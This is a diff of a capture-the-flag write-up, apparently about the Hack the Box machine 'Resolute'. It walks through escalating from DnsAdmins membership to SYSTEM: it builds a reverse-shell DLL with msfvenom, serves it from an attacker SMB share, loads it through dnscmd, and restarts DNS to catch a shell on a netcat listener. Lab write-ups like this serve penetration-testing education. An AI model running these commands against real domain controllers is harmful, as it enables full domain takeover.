@@ -190,38 +190,38 @@ MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-
 
 I was logged in as a member of DNS Admins! Doing some Google-Fu, I came across this <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" target="_blank">Medium</a> article to escelate my privileges. First, on my Kali machine, I used msfvenom to create a malicious DLL to inject onto the machine:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f dll > shell.dll
 {% endhighlight %}
 
 I then used impacket's smb-server to host the newly created DLL, to run from Resolute. <a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a> is another tool that will be used a ton on Hack the Box, and should be on your Kali machine. Impacket is a set of Python classes for working with network protocols, and is a great tool to learn for penetration testing. To spawn this smb-server, from the Impacket examples directory:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 impacket-smbserver test /root/Desktop/HTB/Resolute/
 {% endhighlight %}
 
 And now that the DLL is hosted over SMB, before I can run the attack I have to setup my listener on my Kali box:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 nc -nlvp 9001
 {% endhighlight %}
 
 I then used dnscmd.exe on Resolute to setup the config to run my malicious DLL, thus returning a privileged shell:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 *Evil-WinRM* PS C:\Windows> dnscmd.exe /config /serverlevelplugindll \\10.10.14.13\\test\\shell.dll
 {% endhighlight %}
 
 All I needed to do was call the Resolute machine to stop and start the process:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 *Evil-WinRM* PS C:\Windows> sc.exe stop dns
 *Evil-WinRM* PS C:\Windows> sc.exe start dns
 {% endhighlight %}
 
 And I got a return on my nc listener:
 
-{% endhighlight %}
+{% highlight bash linenos %}
 C:\Windows\system32>whoami
 whoami
 nt authority\system
